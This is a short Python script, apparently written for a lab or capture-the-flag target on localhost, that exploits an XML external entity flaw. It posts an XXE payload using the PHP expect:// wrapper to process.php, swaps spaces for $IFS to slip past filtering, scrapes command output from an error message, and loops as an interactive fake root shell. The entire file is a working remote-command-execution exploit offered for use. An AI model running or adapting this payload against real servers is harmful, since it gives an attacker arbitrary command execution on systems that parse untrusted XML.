import re, os, requests

def rce(cmd):
    cmd = cmd.replace(" ", "$IFS")
    p = f"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY rce SYSTEM "expect://{cmd}"> ]>
<root><username>
&rce;</username><password>asd</password></root>
"""
    r = requests.post('http://localhost:15015/process.php', data=p)
    pattern = re.compile(r'Sorry,(.*? couldn\'t be registered!)', re.DOTALL)
    matches = re.findall(pattern, r.text)[0].replace("couldn't be registered!", "")

    # print(r.text)
    print(matches)

if __name__ == "__main__":
    os.system('clear')
    while True:
        cmd = input('root@ardhani:~$ ')
        rce(cmd)